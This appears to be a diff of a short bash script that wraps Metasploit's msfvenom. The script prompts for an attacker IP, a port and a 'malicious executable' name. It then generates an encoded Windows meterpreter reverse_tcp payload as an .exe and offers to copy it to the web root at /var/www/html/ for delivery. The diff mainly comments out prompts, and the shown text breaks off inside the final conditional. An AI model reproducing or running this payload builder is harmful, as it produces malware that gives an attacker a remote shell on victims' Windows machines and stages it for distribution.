@@ -2,23 +2,21 @@
 
 clear
 figlet METASPLOIT
-echo "********* by SOHAN *********"
-cd Desktop/
 
-echo -n "enter your ip address:"
+#echo -n "enter your ip address:"
 read ip
-echo -n "Enter the desired  port: "
+#echo -n "Enter the desired  port: "
 read port
-echo -n "Enter your malicious executable's name : "
+#echo -n "Enter your malicious executable's name : "
 read name
 
-echo "Generating payload.... "
+#echo "Generating payload.... "
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $name.exe
 
 check=($(ls | grep $name.exe))
 
 
-echo "Payload Generated "
+#echo "Payload Generated "
 echo "Here is your Exe :" $check
 read -r -p "Do you want to send the payload to /var/www/html/  now ? [y/N] " response
 if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
